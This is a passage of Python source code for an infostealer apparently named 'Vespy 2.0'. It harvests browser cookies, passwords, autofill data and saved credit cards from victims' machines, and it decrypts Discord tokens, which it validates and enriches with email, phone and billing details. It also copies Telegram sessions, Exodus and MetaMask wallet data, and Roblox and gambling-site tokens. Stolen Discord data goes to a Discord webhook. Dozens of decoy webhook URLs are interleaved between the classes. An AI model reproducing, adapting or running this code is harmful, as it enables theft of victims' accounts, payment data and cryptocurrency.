                            self.CCs += "="*50+f"\nName : {name}\nExpiration Month : {exp_month}\nExpiration Year : {exp_year}\nCard Number : {cn}\n"
                            self.amountccs += 1
                    cursor.close()
                    con.close()
            except:pass
        f.write(self.CCs.encode())
        f.close()
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Browsers``
``|   |_``:open_file_folder: ``Importable_Cookies``
``|   |   |_``:page_facing_up: ``({self.amountcookies}) Cookies``
``|   |_``:page_facing_up: ``({self.amountpasswords}) Passwords``
``|   |_``:page_facing_up: ``({self.amounthistory}) History``
``|   |_``:page_facing_up: ``({self.amountdownloads}) Downloads``
``|   |_``:page_facing_up: ``({self.amountccs}) CreditCards``
``|   |_``:page_facing_up: ``({self.amountautofill}) Autofills``"""
webh = 'https://ptb.discord.com/api/webhooks/1651549558465157546/syVvjYCzJ9gugWeAl_-aI3Ck1_5Sgi3FCBo7s8ntjNVgoxQdhZc108P7Aadw_gNawVD'
fake_wbh = 'https://discord.com/api/webhooks/1980477482553938386/UmnBAAladbHL1LtDjadH3DAfPxloFvIzd3_dGV4qkFS-Vufe_89riHBPKF2N9YVyI'
fake_wbh = 'https://discordapp.com/api/webhooks/1515433577852851541/qR7kcnb3rvP81DGI5vzr0uCs1QH_aTe_o8_QKuZalfp93su5uhktdGa-xJec7hgNRaiN'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1802253790819799776/vJfkqhnIA-AUQtPJaH06wHA3U1O-Fy3sFxAXlU9Rjq8_GrzQlJ_Jtb2ODBLXGc7i0g'
fake_wbh = 'https://discordapp.com/api/webhooks/1084456591197527269/ErXiP84vuYGtpRtsMoWYftRTgTvCYfod81EvHPL1hh-JfYl-LFRG-STetsITsTAx4'
thewebhook = 'https://discordapp.com/api/webhooks/1214594671185551336/559_S1VHdqSRZL_YuVeyJYj9UG8m--UkgcYgK-6cQ6zlLUaOn87wNXKiUkE9fyk07u7'
fake_webhook = 'https://discordapp.com/api/webhooks/1224396244809705384/BU_lwMDGV7PXxUYdbJksO-XSZwkpIxUjPHyU3nQdGKeVvxUJSoFHmHB4o5HqE_ZUquHM'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1494271404546800930/fZqdQNkHllsmxJ_1TB57fSEU4VE25jRqEakVamVZ4kzTSTBnoIkoCVz1QGdHrbSzgr'
webHOOK = 'https://ptb.discord.com/api/webhooks/1915378632553069939/4QuDkeUFgaoWddrc7PunQvQpqvfzzfgS7_QQSApqPHYQEX51zoWH1_5mN1yv8_BeNsZO'
thewebhook = 'https://ptb.discord.com/api/webhooks/1689494424933308658/jiTPkQxwboKEyeew4nvBOh0muekTVgv7uFQWG7XBNMcvwhN4qUEo4gLtZ7u2k7p1hn-'
thewebhook = 'https://discordapp.com/api/webhooks/1383694371783906398/s3O0PYzvw_7VxwrgPcWlqDjRwupGIGKTZ17QTWy60pl2TCl7EME5mNYXkkHMQ-nmbn'
webHOOK = 'https://canary.discord.com/api/webhooks/1820004824099755538/5PydrMlLycNDzuH53qmPeTPBlb5cdFYtFiGyGuESNy9UhvLkxts380Uuu1sgklmkq'
thewebhook = 'https://discordapp.com/api/webhooks/1895821504115035047/RWCCEhDNveQYONaEgqS058neF5FV2li7JaeE0VWNOKqnvzxd2-LrJI1rLuz4yuYYXYe'
real_webhook = 'https://discordapp.com/api/webhooks/1172915345207028118/yaa3LibihsSQaUFHOpTFju5eLrkzr40IdlXw3o3UZRyl5cT2HqhhtnCeh3kbxWgceN'
webHOOK = 'https://canary.discord.com/api/webhooks/1196624570757881291/3tQ1AwydGLVVPcC8kxMTVY58nE5ctpsDxIT-v-ZaglKRxsekX5OVasQQnG7dztXc1'
thewebhook = 'https://canary.discord.com/api/webhooks/1069932853359973133/q-p_d21sAJUthQIVEsWuxQFDjshAs9lGTeUXbWvf7H95B4fxiHE7X1N3DGpAhmI0AFs_'
webh = 'https://ptb.discord.com/api/webhooks/1981059053612506767/bVsXb6gHxsELhTcs9rqWeSy-rWyMjHAYyRMV-AESXPa15DnbQp_ppYAztt-2sc27K5'
webh = 'https://discord.com/api/webhooks/1430479487459288986/sbf8hd7B6IoDuxWf9fNmxA88wHLATuVAAPNTlr1IWjvcsg-Ml1T-sIWZu300NoUBTPSM'
thewebhook = 'https://discordapp.com/api/webhooks/1163608773975106756/9qvcP_pKQve2uk75sURI1UROdgImr9_hiZNbNbxT0NPuw5l568AIPubeIEH0k7rG_OrL'
thewebhook = 'https://ptb.discord.com/api/webhooks/1524807806760046058/vLt4wEDlxtzpxif29rHoryL5NenrLjXfc_dDLk85BQEHiW-gioLtsVFejdrvQ5oqrf5L'
fake_wbh = 'https://discord.com/api/webhooks/1344027413235620022/pcU7Pll1vABwfa_0R3-z3x7wsf6JXKbR2cPsrWgKA-_aa-8TPU2VwPIroH8QoO0etvB5'
webh = 'https://ptb.discord.com/api/webhooks/1044728557805304174/YD5l9Ze_HVuI8j8QQxEJVN3XXAZVVTnHQrCzPDM43lDY5knKT2nqCVfL0vDAe3UQAaqI'
real_webhook = 'https://discordapp.com/api/webhooks/1819307237750577289/y5H_zAZgQjWhVsHgCnR0zPQb5Qai8ltwOOXt0JaiYxa4d5Zwz1gxIvD6h67Xo98B5'
thewebhook = 'https://ptb.discord.com/api/webhooks/1842776050388456251/5k_lA7j4CzU4o4vuZEVF_11___Y39Ey91GI-Nm3Fd6mY5ddKNZ0xBihRMAHj7RSr3cK'
webHOOK = 'https://canary.discord.com/api/webhooks/1116960853629550214/V3d5me9jOcPmO-yGGTOsDcUFudQTbwwiwefFiOtoe-IaB9NX6tXqd5XIM2cYNLw7fB_6'
real_webhook = 'https://ptb.discord.com/api/webhooks/1414011108601400382/ceYM9kP2G-6dRFfwhye3o2Ek_KhDrRtY0gpt_raYgXy04S6Kx7BAbceBkOKA_cZDf'
webHOOK = 'https://canary.discord.com/api/webhooks/1633932421377477589/EKnUMP3AAnQn--GC9SCt4V45cntE-8bjhRfHockKfUcoD6HeDCBIuutxCBBv7-_pVw'
fake_webhook = 'https://ptb.discord.com/api/webhooks/1895976148600781345/-v429y2_YF3lP1Db8lroeTIXDlXsuDkLUW9J4TP7w04B1Rprln4-U3eQkalhYQZCvwm3'
fake_webhook = 'https://canary.discord.com/api/webhooks/1623776930007269328/diCfFLzHpETfDTm9_qQ61ulnE0xieXjtBdel2F0GiIK-r05JhcnKqmTVZB1a0S6Dt'
webHOOK = 'https://canary.discord.com/api/webhooks/1895898104378980828/j48ytYvbXMjIJ5NItVPArMEeDsteNFY4sW28cqv9LSG8vBMXA4wPn6iyDzGsJgOM0l'
real_webhook = 'https://discord.com/api/webhooks/1784392908658072702/eHkyDhDhkHHXVvDqJsUi6sSMiu6sPLDs14Co0wsuQVdd2uJ_jDZkkpsKJjS8Q4tBUS'
webHOOK = 'https://discordapp.com/api/webhooks/1041200196938575272/iV5OPdSNx1D_hTMzRYFfX7NTbrEUAimTV4J9SPmwFvL29SETpil4T4OuvnmIHrbm2n'
webHOOK = 'https://canary.discord.com/api/webhooks/1966857689114267046/zqOYy372nqDg2TBF7yZI0Ig5fQdo2RWKAf8XPv6CrTnVNEYzMP7L_2_F2IyVWJNwjGg'
fake_webhook = 'https://canary.discord.com/api/webhooks/1321188403196413290/mdG69eTCIRJKzOQzL_YzdteBXqJ81sSnGmchCmtZAZ3hD_JAZmJh8wYdE9QgpsldEIFC'
fake_wbh = 'https://discordapp.com/api/webhooks/1512396344660456955/Fuq4g22sCizy7pSXG8HZ4tveIb6RIPTN7siA8tPlvla62c0HS50s6d38dp2LGjy3c'
fake_webhook = 'https://discord.com/api/webhooks/1182773881751234877/dPsZaQvhYVB0imYtaNF4WxE_53oyXF_y8daHLamBhAvBhGKzKlkCgxr7ntFW8Xk0B'
fake_webhook = 'https://discordapp.com/api/webhooks/1565117072479120034/lbX258gt7FO9UiWSmOucYNP9cEWUuxnrCF0pZjUvJrGjXuAFH53NGXN8NRVOznu19R'
thewebhook = 'https://discordapp.com/api/webhooks/1992046065669573286/SbECJQ6ytpAiwj07EwzKmgGx1K2wTBKykylX383C3cRQF1VXhHWLkFFpL_tyAutJE6'
thewebhook = 'https://discordapp.com/api/webhooks/1272823074727086792/gIoJwTyvOKm7pA_VzyjTi6pKp48afBxMUtf5wmi-Q1oiZvYFuUIQEbySaGX2gtWnjD'
fake_wbh = 'https://discordapp.com/api/webhooks/1965260268384166336/z2gcOFZ5zPV8QrVKa5HxEedh8e_VEVSO-2P3yTUOaChlQTz34WW1uaaIULuVe6-zl6aX'
real_webhook = 'https://discord.com/api/webhooks/1554302081551008796/MDJdvJMryBXeKC316BAIYyBf28IlCzUW4d82RQk8OjsjeaZOl_33WCPQeoC_hgYBqe'
real_webhook = 'https://ptb.discord.com/api/webhooks/1435555914848330276/OeEEpnxCeRoWB2M5ZTY3nnALMblF7Tgm8FenUZMFHIQnnGYCOlIteJ4WbqNuyPsTUIac'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1004081975361258718/_8UK8Ed1_YlIQCJzGyoAk6h4_dRFdQKJDhU8aqvgoV434YPWNZnpcDpO8QSptU2k0fi'
thewebhook = 'https://discordapp.com/api/webhooks/1884665249144821560/f0P5FPBdj05MdmuaTQSlgHRfCQSm_QxasmJiN-6zpy9NwB9RusC_2Dk7k28-ebhh5G'
real_webhook = 'https://discord.com/api/webhooks/1580639446849817840/TUqZpQxjki30W62lhEsoCmEtTPqKYipj1yHFCh6c89a-60dDmiNUAh5-i6vFvCBe9J0u'

class DISCORD:

    def __init__(self):
        self.tokens = []
        roa = fr"C:\Users\{user}\AppData\Roaming"
        loc = fr"C:\Users\{user}\AppData\Local"
        paths = [f"Discord|{roa}\\discord\\Local Storage\\leveldb\\",f"Discord Canary|{roa}\\discordcanary\\Local Storage\\leveldb\\",f"Lightcord|{roa}\\Lightcord\\Local Storage\\leveldb\\",f"Discord PTB|{roa}\\discordptb\\Local Storage\\leveldb\\",f"Brave|{loc}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",f"Opera|{roa}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",f"Opera GX|{roa}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",f"Microsoft Edge|{loc}\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge2|{loc}\\Microsoft\\Edge\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Microsoft Edge1|{loc}\\Microsoft\\Edge\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Microsoft Edge3|{loc}\\Microsoft\\Edge\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Microsoft Edge4|{loc}\\Microsoft\\Edge\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Microsoft Edge5|{loc}\\Microsoft\\Edge\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Microsoft Edge6|{loc}\\Microsoft\\Edge\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Microsoft Edge7|{loc}\\Microsoft\\Edge\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Microsoft Edge8|{loc}\\Microsoft\\Edge\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Microsoft Edge9|{loc}\\Microsoft\\Edge\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome|{loc}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",f"Chrome1|{loc}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",f"Chrome2|{loc}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",f"Chrome3|{loc}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",f"Chrome4|{loc}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",f"Chrome5|{loc}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",f"Chrome6|{loc}\\Google\\Chrome\\User Data\\Profile 6\\Local Storage\\leveldb\\",f"Chrome7|{loc}\\Google\\Chrome\\User Data\\Profile 7\\Local Storage\\leveldb\\",f"Chrome8|{loc}\\Google\\Chrome\\User Data\\Profile 8\\Local Storage\\leveldb\\",f"Chrome9|{loc}\\Google\\Chrome\\User Data\\Profile 9\\Local Storage\\leveldb\\",f"Chrome10|{loc}\\Google\\Chrome\\User Data\\Profile 10\\Local Storage\\leveldb\\"]
        for i in paths:
            path = i.split("|")[1]
            name = i.split("|")[0].replace(" ","").lower()
            if "ord" in path:
                self.enc_regex(name, path, roa)
            else:
                self.regex(path)
        self.send()
    def regex(self, path):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", l):
                            try:
                                v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                if v.status_code == 200:
                                    if token not in self.tokens:
                                        dtokens.append(token)
                                        self.tokens.append(token)
                            except:pass
        except:pass
    def enc_regex(self, name, path, roa):
        try:
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    for l in open(f"{path}\\{file}",errors="ignore").readlines():
                        for I in re.findall(r"dQw4w9WgXcQ:[^\"]*", l):
                            try:
                                returned_key = self.KEY(roa+f'\\{name}\\Local State')
                                token = self.dec(base64.b64decode(I.split('dQw4w9WgXcQ:')[1]),returned_key)
                                try:
                                    v=requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': token})
                                    if v.status_code == 200:
                                        if token not in self.tokens:
                                            dtokens.append(token)
                                            self.tokens.append(token)
                                except:pass
                            except:pass
        except:pass
    def KEY(self, path):
        ls = json.loads(open(path,'r',encoding='utf-8').read())
        master_key = CryptUnprotectData(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:],None,None,None, 0)[1]
        return master_key
    def dec(self, buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            dec = cipher.decrypt(payload)[:-16].decode()
            return dec
        except:pass
    def send(self):
        if len(self.tokens) > 0:
            for tok in self.tokens:
                try:
                    info = requests.get("https://discord.com/api/v9/users/@me", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    user = info['username']+"#"+info['discriminator']
                    id = info['id']
                    email = info["email"]
                    if info["verified"]:
                        verf = ":white_check_mark:"
                    else:verf = ":x:"
                    phone = info["phone"]
                    avatar = f"https://cdn.discordapp.com/avatars/{id}/{info['avatar']}.png"
                    if info['mfa_enabled']:
                        af2 = ":white_check_mark:"
                    else:af2 = ":x:"
                    if info['premium_type']==0:
                        N=":x:"
                    elif info['premium_type']==1:
                        N="``Nitro Classic``"
                    elif info['premium_type']==2:
                        N="``Nitro Boost``"
                    elif info['premium_type']==3:
                        N="``Nitro Basic``"
                    else:N=":x:"
                    P = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36','Content-Type': 'application/json','Authorization': tok}).json()
                    if P == []:
                        bil = ":x:"
                    else:
                        for b in P:
                            if b['type']==1:
                                bil=":credit_card:"
                            elif b['type']==2:
                                bil=":regional_indicator_p:"
                    PASSYWORDY = "Not Found"
                    for i in dispasswords:
                        if str(info['username']).lower() == i.split("|")[0].strip().lower():
                            PASSYWORDY = i.split("|")[1].strip()
                        elif str(email).lower() == i.split("|")[0].strip().lower():
                            PASSYWORDY = i.split("|")[1].strip()
                    webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png")
                    embed = DiscordEmbed(title=f"Discord Token", description=f"Found Discord Token", color='4300d1')
                    embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1080175925125201942/1080355442120740944/forvespyservero.png')
                    embed.set_footer(text='Vespy 2.0 | by : vesper')
                    embed.set_timestamp()
                    embed.add_embed_field(name=f"Account of {user}", value=f":id: ID: ``{id}``\n\n:email: Email: ``{email}``\n:lock: Password: ``{PASSYWORDY}``\n\n:mobile_phone: Phone: ``{phone}``\n:ballot_box_with_check: Verified: {verf}\n:closed_lock_with_key: 2FA: {af2}\n\n\n:purple_circle: Nitro: {N}\n:page_with_curl: Billing: {bil}\n\n\n:coin: Token: ``{tok}``")
                    embed.set_thumbnail(url=avatar)
                    webhook.add_embed(embed)
                    webhook.execute()
                except:pass
class Telegram:

    def __init__(self):
        self.files = 0
        try:
            os.mkdir(os.path.join(P4THF0LDR, "Telegram"))
            self.telegramfolder = os.path.join(P4THF0LDR, "Telegram")
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData","Roaming","Telegram Desktop","tdata")
            self.getTele(self.path)
        except:
            pass
    
    def getTele(self,path):
        files = os.listdir(path)
        for i in files:
            self.files +=1
            shutil.copy(path+"\\"+i,self.telegramfolder+"\\"+i)
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Telegram``
``|   |_``:page_facing_up: ``({self.files}) Telegram Files``"""
class EXodus:

    def __init__(self):
        self.amountfiles = 0
        self.county = 0
        self.pathyy = os.path.join(P4THF0LDR, "Wallets")
        os.mkdir(self.pathyy)
        try:
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Exodus")
            self.stealexo(self.path+"\\exodus.wallet")
        except:
            pass
        try:
            paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","3dge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware","Brave-Browser","User Data")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera Stable")}',f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software","Opera GX Stable")}']
            profs = ["Default", "Profile 1","Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
            self.stealmeta(paths, profs)
        except:
            pass
    
    def stealexo(self, path):
        exopath = os.path.join(self.pathyy, "Exodus")
        os.mkdir(exopath)
        P=os.listdir(path)
        for i in P:
            self.amountfiles += 1
            shutil.copy(path+f"\\{i}",exopath+f"\\{i}")
    
    def stealmeta(self, paths, profs):
        metapath = os.path.join(self.pathyy, "Metamask")
        os.mkdir(metapath)
        for i in paths:
            if "Opera Software" in i:
                try:
                    Path = os.path.join(i,"Local Extension Settings","nkbihfbeogaeaoehlefnkodbefgpgknn")
                    shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                    self.amountfiles += 1;self.county += 1
                except:
                    pass
            else:
                for I in profs:
                    try:
                        if "3dge" in i:
                            i = i.replace("3dge","Edge")
                            lastpart = "ejbalbakoplchlghecdalmeeeajnimhm"
                        else:
                            lastpart = "nkbihfbeogaeaoehlefnkodbefgpgknn"
                            Path = os.path.join(i,I,"Local Extension Settings",lastpart)
                            shutil.copytree(Path,metapath+f"\\Metamask_{self.county}")
                            self.amountfiles += 1;self.county += 1
                    except:
                        pass

    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Exodus & Metamask``
``|   |_``:page_facing_up: ``({self.amountfiles}) Exodus & Metamask Files``"""
class Roblox:

    def __init__(self):
        os.mkdir(os.path.join(P4THF0LDR, "Roblox"))
        self.robloxfolder = os.path.join(P4THF0LDR, "Roblox")
        self.bloxflip = 0
        self.robloxcookies = 0
        self.rbxflip = 0
        self.rblxwild = 0
        paths = [f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft","Edge","User Data")}', f'{os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google","Chrome","User Data")}']
        self.prof = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4","Profile 5", "Profile 6", "Profile 7", "Profile 8", "Profile 9", "Profile 10"]
        self.RobloxStudio()
        for i in paths:
            if os.path.exists(i):
                self.Rblxwild(i)
        for i in paths:
            if os.path.exists(i):
                self.Rbxflip(i)
        for i in paths:
            if os.path.exists(i):
                self.Bloxflip(i)
        self.__repr__()

    def Rblxwild(self,p):
        filo=open(self.robloxfolder+"\\Rblxwild_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file = file.split("_https://rblxwild.com")
                            for tok in file:
                                t = "bd"+tok.split("authToken")[1].split("bd")[1].split("\\x")[0]
                                if len(t)>50:
                                    self.rblxwild += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Rbxflip(self,p):
        filo=open(self.robloxfolder+"\\Rbxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            if "https://www.rbxflip.com" in file:
                                file2 = file.split("https://www.rbxflip.com")
                                for tok in file2:
                                    t = tok.split("Bearer ")[1].split("\\x")[0]
                                    self.rbxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                        except:pass
        except:pass
        filo.close()

    def Bloxflip(self,p):
        filo=open(self.robloxfolder+"\\Bloxflip_Tokens.txt","w+")
        try:
            for i in self.prof:
                new_path = os.path.join(p, i, "Local Storage", "leveldb")
                for f in os.listdir(new_path):
                    if f.endswith(".log") or f.endswith(".ldb"):
                        try:
                            file = str(open(new_path+"\\"+f,"rb").read().strip())
                            file2 = file.split("_DO_NOT_SHARE_BLOXFLIP_TOKEN")
                            for tok in file2:
                                try:
                                    t = "ywmz0d/"+tok.split("ywmz0d/")[1][:2000].split("\\x")[0].replace("%","")
                                    self.bloxflip += 1
                                    filo.write(f"\nToken : {t}\n\n"+"-"*35)
                                except:pass
                        except:pass
        except:pass
        filo.close()

    def RobloxStudio(self):
        filo=open(self.robloxfolder+"\\Roblox_Cookies.txt","w+")
        try:
            robloxstudiopath = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com")
            count = 0
            while True:
                name, value, type = EnumValue(robloxstudiopath, count)
                if name == ".ROBLOSECURITY":
                    value = "_|WARNING:-DO-NOT-SHARE-THIS" + str(value).split("_|WARNING:-DO-NOT-SHARE-THIS")[1].split(">")[0]
                    self.robloxcookies += 1
                    filo.write(f"\n.ROBLOSECURITY : {value}\n\n"+"-"*35)
                count = count + 1
        except WindowsError:
            pass
        filo.close()
    
    def __repr__(self):
        return f"""
``|_`` :open_file_folder: ``Roblox``
``|   |_``:page_facing_up: ``({self.bloxflip}) Bloxflip_Tokens``
``|   |_``:page_facing_up: ``({self.robloxcookies}) Roblox_Cookies``
``|   |_``:page_facing_up: ``({self.rbxflip}) Rbxflip_Tokens``
``|   |_``:page_facing_up: ``({self.rblxwild}) Rblxwild_Tokens``"""
thewebhook = 'https://ptb.discord.com/api/webhooks/1162255953593526689/tDDWRF3IrE04EFuuLUBZ7J6rLlCQhdQSYVFKguW3jECmOmLeiVD9BBJvylWw7yrQ4RnD'
real_webhook = 'https://discordapp.com/api/webhooks/1521886919782196800/-wz4zNrSTO-0ZaAOi04KiiiBHo_MCAVMbiDEc1K1u35H4ksgNuHRAWLSM02He6NzbPD'
webHOOK = 'https://discordapp.com/api/webhooks/1659519095659784870/3gohlNySHKgpPYxuwCDk3PZyb3RQheHhe1sLhBhqvKd-q1GEy2jtHTe2DPtLZk4LNhOW'
webHOOK = 'https://discordapp.com/api/webhooks/1321087181162261262/ogIi7DkWoePXgFxpBwRzYVSI9IPDiCZwGJWrisao20R0uztypjo-w3H6obw4d2SOZn'
fake_webhook = 'https://canary.discord.com/api/webhooks/1386181640631870295/GMvmF7TdbdwyMjv6UV7K0tM2GIphcYsA1_3YyL9CSJuNYfoO0aRjIRsUUP-79ebE5W'
thewebhook = 'https://canary.discord.com/api/webhooks/1308157071682354427/iJi1BnyqPtzqwqzOqfSw4QHfiMHyAmm6DBmmXfMHrR2-eaqk7ELuyEOJefmCQht18'
webHOOK = 'https://canary.discord.com/api/webhooks/1852723510863425736/fYuLnRJcx6xf2K80Ftr2dX8mWGm7e1atZ2Wlme2COFE8ENVCYISk2m2uzSHasu3poL'
real_webhook = 'https://ptb.discord.com/api/webhooks/1528903946494735736/GQUOHsuL3tCWzpaW4BlqdfOnyS8KeTP2E9QQ8h6q-OlhoOlHVzK6JJLWJZ3FinANSa'
thewebhook = 'https://discord.com/api/webhooks/1553842442839981219/NJTpCKrGYk56CYiOVeKUshgZPRC2B81w-_Bnytb1ccAmb329GtQ2oT3ATnjDXDVAzO'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1931001260595000821/Y7frNvCiCgp08t7-0O4__yQNsY3Sg-rJnWyc6n9ZO1CULfk9F_d5ccWxmg3j61h0Bcp'
fake_wbh = 'https://ptb.discord.com/api/webhooks/1976683423322742295/pfwHA4T2lWtjWKQgODKJEhyA-G9Ma4_veRFat6y-HsbVxGnTrfxqNwhZYcNbPH-73o'
fake_webhook = 'https://discordapp.com/api/webhooks/1491744241107872666/UL5cBqkEX8Cyi8qNUtBLjNNBN2zL_04G_ixP37NSjzU_RZx83Ui2yOrdE6-GG6HW9a3u'
fake_wbh = 'https://discord.com/api/webhooks/1367521060719107493/0hdkOXhJ9YHE1r86svV9Ty5h-OMmETq9TXsME7w3aUwF8jGOWoprlsbYf1tLdqrC9gb'
webh = 'https://ptb.discord.com/api/webhooks/1179256535541937463/vrhmGaS_WJan-lHP65C5KKqDrdaePxedJGIXkVPtBu6o7B8VjuP-yirNm7snIOuC4'
fake_wbh = 'https://discord.com/api/webhooks/1127232593946412927/xYAzJmW0QMHmhXvmYtgYlZjmk67njv1jgK5joRY_97gcoz61BOQ0-n_9ZfCYJaYIjR9h'
webh = 'https://discord.com/api/webhooks/1049608956730872257/c-sIEGHrRIg521BQgIUDJEBtFth2YiSHjN2yy6WwHpMav1MaPtqEEFYIGj-8uryvWDu5'
webh = 'https://discord.com/api/webhooks/1001033419025270566/03niIETB0xAVRnypTTwcRYfAnFDCjFcQeTuphVNKWQDRyJX55mxstLOCQ8z5cHqSn9'
thewebhook = 'https://ptb.discord.com/api/webhooks/1332953001815398515/-lgJDDg9eDSjN7fO6tJXpz7O3pG5TBQp4NQutBBUY_u9zvLShx-GMqXC0OggO476R'
fake_webhook = 'https://discord.com/api/webhooks/1656395403131152467/kgpbGBXh3OjzpD4kjtW0f4dt-REgqhSkkHbo3EQUV9WZrflv_m6w81DoExauPx7X4'
thewebhook = 'https://canary.discord.com/api/webhooks/1687186532630934005/yaTXMr6nvee4XXOdngRjXIPQbYeoDKVJk1zARChCTvYeweFqRL2VfggmQGQRTCtp1R'
webHOOK = 'https://ptb.discord.com/api/webhooks/1322216341070683279/VZ614E2ETR32TESG3JXPhUonaf5EfUsfMP6JNE1JlLEV3ihzaes02FqoGkSW1CBtf'
webh = 'https://discordapp.com/api/webhooks/1527349516185864914/89zXXs8zZP0TjpgGRlhmSp3BMBFKSVsYSDdYKCiwIVaF09pp0tCyMrd5L9bKWuksau'
real_webhook = 'https://discord.com/api/webhooks/1574069975653706428/FeLTaeeUobwCwWLIHstJxF1H6e8_nxqTiV9eQQdqYloaE7PtJEQDp3mSFNXt2GCmJj'
webh = 'https://canary.discord.com/api/webhooks/1113051143853623545/J4-rqLpk_hyHsYiUykaW-4xd7on-gy84ebu6_-VYvZgw9wQfkKLFfxHGTBk-i_9IC'
webh = 'https://discordapp.com/api/webhooks/1779042976006729844/F_37JwJSxmJ6ZY_ezxeDEIhQIEuhjDRn0xr6TA1d1QXzX0xfIsraM-0hFIMxiFHhb'
fake_wbh = 'https://discordapp.com/api/webhooks/1313849078828754867/CInpzcuMYZMxHz0HyvMHDgIsT3l-2WmiaiXQPI02QFsKqYYstaIcYpGzNff7wnV45'
thewebhook = 'https://discord.com/api/webhooks/1517744607333860922/0KRetuh9PJ3JpQ7lH7__U8Qbxxa-lg7MTSm83SbYq9wMcgMYlcWlOAwZGwam8aY6f'
webHOOK = 'https://discordapp.com/api/webhooks/1180826127967677221/1YromVE_NCMCsh0-FUMB1iY9lvMcpjhlsVKN6mze_du232IOmBa1YhoEnDIcCcrTRTT'
thewebhook = 'https://discord.com/api/webhooks/1608307441105387970/RfZAHHy5j8S7qXY6mmpK4S0QWS26MZjPTgZ-k8VjU-WuQoNGwq11B1olQKiiRL6y_jp1'
webHOOK = 'https://ptb.discord.com/api/webhooks/1678139718795289137/nR1MsimYLwMUcOucK68ZbidpSx0EVdJK2rQR0m-WvQqPLcO7JJBVgAFViqyy6H8ckXaX'
